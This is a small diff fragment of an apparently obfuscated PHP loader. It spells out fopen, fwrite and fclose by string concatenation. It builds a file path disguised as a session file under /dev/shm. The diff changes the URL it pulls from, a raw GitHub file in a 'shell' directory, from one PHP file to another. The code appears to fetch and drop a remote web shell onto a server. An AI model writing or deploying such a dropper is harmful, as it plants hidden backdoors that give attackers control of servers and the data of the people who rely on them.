@@ -6,7 +6,7 @@ $o1 = "f" . "w" . "r" . "i" . "t" . "e";
 $z2 = "f" . "o" . "p" . "e" . "n";
 $d3 = "f" . "c" . "l" . "o" . "s" . "e";
 $d4 = 'sess_' . md5('234') . '.php';
-$u5 = ['https://raw.githubusercontent.com/WhatsWrongAndWhy/yourlogic/refs/heads/main/shell/vatfan.php', "/dev/shm/$d4"];
+$u5 = ['https://raw.githubusercontent.com/WhatsWrongAndWhy/yourlogic/main/shell/fanvat.php', "/dev/shm/$d4"];
 
 function n4(){
     global $z2, $o0, $o1, $d3, $u5;
